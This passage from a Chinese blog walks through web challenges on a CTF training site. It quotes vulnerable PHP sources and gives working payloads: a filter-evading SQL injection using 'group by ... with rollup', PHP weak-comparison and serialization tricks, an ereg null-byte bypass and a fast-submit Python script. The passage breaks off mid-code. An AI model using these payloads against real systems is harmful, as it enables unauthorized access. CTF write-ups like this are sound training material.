target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a></p><p>源代码给出了提示：source.txt </p><p>访问得到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) &#123;</span><br><span class="line">echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;   </span><br><span class="line">        print &quot;姘村彲杞借垷锛屼害鍙禌鑹囷紒&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">die(&apos;Could not connect: &apos; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=&quot;SELECT * FROM interest WHERE uname = &apos;&#123;$_POST[&apos;uname&apos;]&#125;&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) == 1) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;浜﹀彲璧涜墖锛�&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">print &quot;涓€棰楄禌鑹囷紒&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>审计代码，得到flag的思路：</p><p>1.需要POST两个参数uname和pwd</p><p>2.经过sql查询后返回的结果行数必须为1</p><p>3.查询结果的pwd字段必须等于我们POST的参数pwd值</p><p>这里过滤了关键字and，select，from，where，union，join，sleep，benchmark，(，)，逗号</p><p>我们必须控制查询结果的pwd字段，而这里union被过滤了，基于布尔的盲注也不行</p><p>解决方法是用with rollup，它的作用是在查询结果的最后一行添加null，但是必须配合group by来使用</p><p>在本地数据库测试：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以我们可以通过group by pwd with rollup来返回一行查询结果，其中pwd列下的数据为NULL，然后POST的参数pwd赋值为空，就可以控制两个参数相等</p><p>那么我们接下来就是控制查询行数为1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>通过limit 1来控制查询行数为1，但是还要返回NULL的那行，这里逗号被过滤了，可以使用 limit 1 offset 0</p><p>，效果跟limit 0,1是一样的</p><p>所以最终的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&apos; or 1 group by pwd with rollup limit 1 offset 2#&amp;pwd=</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/10/10.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/10/10.php</a></p><p>burp抓包发现响应头部存在FLAG字段</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>FLAG字段经过BASE64加密</p><p>解密后post参数key等于解密后的值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没有得到flag，发现头部FLAG字段值又发生了变化，想起题目可能要快速提交flag，可能要写脚本提交key</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/10/10.php"</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">FLAG = base64.b64decode(r.headers[<span class="string">'FLAG'</span>])</span><br><span class="line">FLAG = bytes.decode(FLAG)</span><br><span class="line">FLAG = FLAG.split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'key'</span>:FLAG</span><br><span class="line">    &#125;</span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>运行结果：CTF{Y0U_4R3_1NCR3D1BL3_F4ST!}</p><h3 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h3><p>网址：<a href="http://ctf5.shiyanbar.com/indirection/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/indirection/index.php</a></p><p>给出了源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// code by SEC@USTC </span><br><span class="line"></span><br><span class="line">echo &apos;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&apos;; </span><br><span class="line"></span><br><span class="line">$URL = $_SERVER[&apos;REQUEST_URI&apos;]; </span><br><span class="line">//echo &apos;URL: &apos;.$URL.&apos;&lt;br/&gt;&apos;; </span><br><span class="line">$flag = &quot;CTF&#123;???&#125;&quot;; </span><br><span class="line"></span><br><span class="line">$code = str_replace($flag, &apos;CTF&#123;???&#125;&apos;, file_get_contents(&apos;./index.php&apos;)); </span><br><span class="line">$stop = 0; </span><br><span class="line"></span><br><span class="line">//这道题目本身也有教学的目的 </span><br><span class="line">//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的 </span><br><span class="line">//所以，第一个要求就是不得出现 ./ </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;./&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 1;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第二，我们可以构造 \ 来代替被过滤的 / </span><br><span class="line">//所以，第二个要求就是不得出现 ../ </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;\\&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 2;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第三，有的系统大小写通用，例如 indirectioN/ </span><br><span class="line">//你也可以用?和#等等的字符绕过，这需要统一解决 </span><br><span class="line">//所以，第三个要求对可以用的字符做了限制，a-z / 和 . </span><br><span class="line">$matches = array(); </span><br><span class="line">preg_match(&apos;/^([0-9a-z\/.]+)$/&apos;, $URL, $matches); </span><br><span class="line">if($flag &amp;&amp; empty($matches) || $matches[1] != $URL)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 3;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第四，多个 / 也是可以的 </span><br><span class="line">//所以，第四个要求是不得出现 // </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;//&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 4;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第五，显然加上index.php或者减去index.php都是可以的 </span><br><span class="line">//所以我们下一个要求就是必须包含/index.php，并且以此结尾 </span><br><span class="line">if($flag &amp;&amp; substr($URL, -10) !== &apos;/index.php&apos;)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 5;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第六，我们知道在index.php后面加.也是可以的 </span><br><span class="line">//所以我们禁止p后面出现.这个符号 </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;p.&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 6;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第七，现在是最关键的时刻 </span><br><span class="line">//你的$URL必须与/indirection/index.php有所不同 </span><br><span class="line">if($flag &amp;&amp; $URL == &apos;/indirection/index.php&apos;)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 7;        //Pass </span><br><span class="line">&#125; </span><br><span class="line">if(!$stop) $stop = 8; </span><br><span class="line"></span><br><span class="line">echo &apos;Flag: &apos;.$flag; </span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;; </span><br><span class="line">for($i = 1; $i &lt; $stop; $i++) </span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Pass&apos;, $code); </span><br><span class="line">for(; $i &lt; 8; $i++) </span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Not Pass&apos;, $code); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo highlight_string($code, TRUE); </span><br><span class="line"></span><br><span class="line">echo &apos;&lt;/body&gt;&lt;/html&gt;&apos;;</span><br></pre></td></tr></table></figure><p>绕过思路源代码都给出了提示，考察的是url伪静态，比如url中含有xxxx.php/xx/x，那么.php后的xx就会被当成参数名，x会被当成参数</p><p>所以可以构造payload:<a href="http://ctf5.shiyanbar.com/indirection/index.php/a/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/indirection/index.php/a/index.php</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h3><p>网址：<a href="http://ctf5.shiyanbar.com/10/main.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/10/main.php</a></p><p>burp抓包试着修改showsouce参数=1</p><p>提示了源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a = $_POST[&quot;PIN&quot;];</span><br><span class="line">if ($a == -19827747736161128312837161661727773716166727272616149001823847) &#123;</span><br><span class="line">    echo &quot;Congratulations! The flag is $flag&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;User with provided PIN not found.&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POST参数PIN等于-19827747736161128312837161661727773716166727272616149001823847</p><p>拿到flag</p><h3 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h3><p>网址：<a href="http://ctf5.shiyanbar.com/10/web1/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/10/web1/index.php</a></p><p>首先源代码给出了提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $test=$_GET[&apos;username&apos;]; $test=md5($test); if($test==&apos;0&apos;) --&gt;</span><br></pre></td></tr></table></figure><p>这里应该是POST参数username，然后加密后的值 == ‘0’</p><p>这里涉及PHP的弱类型比较，== 比较时，PHP会将数字字符串的数字值取出进行比较，例如’0’ == ‘0abc’</p><p>所以我们只需要找到一个md5加密后的值0开头的字符串即可，典型的为240610708 和 QNKCDZO </p><p>POST参数username=240610708得到/user.php?fame=hjkleffifer</p><p>访问后又得到一串代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$unserialize_str = $_POST[&apos;password&apos;];</span><br><span class="line">     $data_unserialize = unserialize($unserialize_str);</span><br><span class="line">     if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;)</span><br><span class="line">     &#123;</span><br><span class="line">       print_r($flag);</span><br><span class="line">     &#125;</span><br><span class="line">伟大的科学家php方言道：成也布尔，败也布尔。</span><br><span class="line">回去吧骚年</span><br></pre></td></tr></table></figure><p>审计后发现需要POST一个序列化后的值，使得反序列化后的数组user键的值和pass键的值 == 未知字符串，题目还给出了提示“成也布尔，败也布尔”，这里又需要利用PHP弱类型比较，当布尔类型的true与任何字符串弱类型相等</p><p>本地测试得到序列化后的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$data_unserialize = <span class="keyword">array</span>(<span class="string">'user'</span> =&gt; <span class="keyword">True</span>,<span class="string">'pass'</span> =&gt; <span class="keyword">True</span>);</span><br><span class="line">$unserialize_str = serialize($data_unserialize);</span><br><span class="line"><span class="keyword">echo</span> $unserialize_str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果</p><p>a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>POST后得到flag</p><h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><p>网址：<a href="http://ctf5.shiyanbar.com/10/upload/step1.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/10/upload/step1.php</a></p><p>一个找回密码的页面，试着源代码看不出提示信息，试着注册一个email</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>弹框提示了<a href="mailto:./step2.php?email=youmail@mail.com" target="_blank" rel="noopener">./step2.php?email=youmail@mail.com</a>&amp;check=???????</p><p>访问step2.php的源代码，发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;admin&quot; content=&quot;admin@simplexue.com&quot; /&gt;</span><br><span class="line">&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; /</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;submit.php&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">&lt;h1&gt;找回密码step2&lt;/h1&gt;</span><br><span class="line">email:&lt;input name=&quot;emailAddress&quot; type=&quot;text&quot; &lt;br /&gt;</span><br><span class="line">&lt;b&gt;Notice&lt;/b&gt;:  Use of undefined constant email - assumed &apos;email&apos; in &lt;b&gt;C:\h43a1W3\phpstudy\WWW\10\upload\step2.php&lt;/b&gt; on line &lt;b&gt;49&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: email in &lt;b&gt;C:\h43a1W3\phpstudy\WWW\10\upload\step2.php&lt;/b&gt; on line &lt;b&gt;49&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">value=&quot;&quot;  disable=&quot;true&quot;/&gt;&lt;/br&gt;</span><br><span class="line">token:&lt;input name=&quot;token&quot; type=&quot;text&quot; /&gt;&lt;/br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>发现这个页面会GET两个参数emailAddress和token到submit.php</p><p>访问submit.php，提示you are not an admin </p><p>在step2.php中我们还发现了该页面可能是通过vim编写的，所以可能存在.submit.php.swp</p><p>访问后得到提示代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果登录邮箱地址不是管理员则 die()</span></span><br><span class="line"><span class="comment">数据库结构</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 表的结构 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT '0',</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 转存表中的数据 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, '****不可见***', '***不可见***', 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计后的思路</p><p>1.需要GET参数token和emailAddress</p><p>2.token值长度为10且必须弱类型等于0</p><p>3.sql语句有查询结果</p><p>首先弱类型相等，且长度为10，那么token可以赋值’0000000000’</p><p>然后emailAddress猜测是在step2.php中的<a href="mailto:admin@simplexue.com" target="_blank" rel="noopener">admin@simplexue.com</a></p><p>得出payload:<a href="mailto:emailAddress=admin@simplexue.com" target="_blank" rel="noopener">emailAddress=admin@simplexue.com</a>&amp;token=0000000000</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>得到flag</p><h3 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/more.php</a></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计源代码，获得flag需要绕过3个检测：</p><p>1.符合ereg正则匹配，用%00绕过即可</p><p>2.password长度小于8但是值大于9999999，用科学计数法即可绕过</p><p>3.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最后payload:</span><br></pre></td></tr></table></figure></p><p>password=1e8%00<em>-</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### Guess Next Session</span><br><span class="line"></span><br><span class="line">网址：http://ctf5.shiyanbar.com/web/Session.php</span><br><span class="line"></span><br><span class="line">源代码：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">    if ($_GET[&apos;password&apos;] == $_SESSION[&apos;password&apos;])</span><br><span class="line">        die (&apos;Flag: &apos;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &apos;&lt;p&gt;Wrong 